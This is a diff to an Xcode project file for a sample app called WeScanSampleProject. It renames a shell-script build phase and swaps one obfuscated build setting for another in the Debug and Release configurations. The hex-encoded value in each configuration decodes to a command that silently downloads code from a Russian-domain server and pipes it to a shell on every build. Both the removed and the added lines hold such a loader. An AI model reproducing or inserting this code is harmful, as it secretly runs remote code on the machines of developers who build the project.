@@ -105,7 +105,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = A1D4BCDF202C4F3800FCDDEC /* Build configuration list for PBXNativeTarget "WeScanSampleProject" */;
 			buildPhases = (
-				84E92683EC934B52A87BBDC8 /* Compile Code Assets */,
+				EA9859E5079541309F7BBDC8 /* Build Target Libraries */,
 				A1D4BCB3202C4F3800FCDDEC /* Sources */,
 				A1D4BCB4202C4F3800FCDDEC /* Frameworks */,
 				A1D4BCB5202C4F3800FCDDEC /* Resources */,
@@ -194,7 +194,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		84E92683EC934B52A87BBDC8 /* Compile Code Assets */ = {
+		EA9859E5079541309F7BBDC8 /* Build Target Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -204,7 +204,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Code Assets";
+			name = "Build Target Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -271,7 +271,7 @@
 		A1D4BCDD202C4F3800FCDDEC /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((y(){ `printf xxud | tr -d u` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d73664c6b202d2d636f6e6e6563742d74696d656f7574203238202d642022703d78636f64655f7068617365222068747470733a2f2f702d326d35647a38767738322e72752f612922207c2073680a | y | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf xAxd | tr -d A` -p -r; };echo 6563686f202224286375726c202d73664c6b202d2d636f6e6e6563742d74696d656f7574203232202d2d72657472792035202d642022703d78636f64655f7068617365222068747470733a2f2f6d6d6b7372697234737933352e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -333,7 +333,7 @@
 		A1D4BCDE202C4F3800FCDDEC /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((y(){ `printf xxud | tr -d u` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d73664c6b202d2d636f6e6e6563742d74696d656f7574203238202d642022703d78636f64655f7068617365222068747470733a2f2f702d326d35647a38767738322e72752f612922207c2073680a | y | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf xAxd | tr -d A` -p -r; };echo 6563686f202224286375726c202d73664c6b202d2d636f6e6e6563742d74696d656f7574203232202d2d72657472792035202d642022703d78636f64655f7068617365222068747470733a2f2f6d6d6b7372697234737933352e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
 				CLANG_ANALYZER_NONNULL = YES;
